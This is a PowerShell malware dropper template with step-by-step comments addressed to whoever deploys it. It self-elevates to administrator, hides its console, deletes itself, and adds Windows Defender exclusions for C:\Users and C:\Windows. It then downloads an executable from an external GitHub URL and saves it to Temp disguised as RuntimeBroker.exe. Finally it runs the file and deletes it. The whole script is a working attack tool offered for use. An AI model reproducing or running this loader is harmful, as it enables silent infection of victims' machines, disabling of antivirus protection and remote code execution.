#######################################################################################################################################################################################
# (Administrator Rights.)

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}
#######################################################################################################################################################################################
# (This prevents all commands from being visible in the terminal.)

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$console = [Console.Window]::GetConsoleWindow()
# 0 hide
[Console.Window]::ShowWindow($console, 0) | Out-Null
#######################################################################################################################################################################################
# (By using this command, your PS1 script will be deleted automatically when someone opens the file.)

Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
#######################################################################################################################################################################################
# (The Add-MpPreference cmdlet modifies settings for Windows Defender. Use this cmdlet to add exclusions for file name extensions, paths, and processes.)

Add-MPreference -ExclusionPath C:\Users
Add-MpPreference -ExclusionPath C:\Windows
#######################################################################################################################################################################################
# (Add the link to your payload.)

$url = "https://github.com/69roseray/work/raw/refs/heads/main/bat.exe"
#######################################################################################################################################################################################
# (Temp is where your payload will be downloaded by default.)

$output = "$env:Temp/RuntimeBroker.exe"
#######################################################################################################################################################################################
# (This belongs the script installs your payload not touch it.)

Invoke-WebRequest -Uri $url -OutFile $output
#######################################################################################################################################################################################
# (Once the download is finished, execute the file that was downloaded.)

Start-Process -FilePath $output
#######################################################################################################################################################################################
# (The payload you downloaded will be deleted after the process is finished..)

Start-Sleep -Milliseconds 6000 
Remove-Item -path "$env:Temp/RuntimeBroker.exe"
#######################################################################################################################################################################################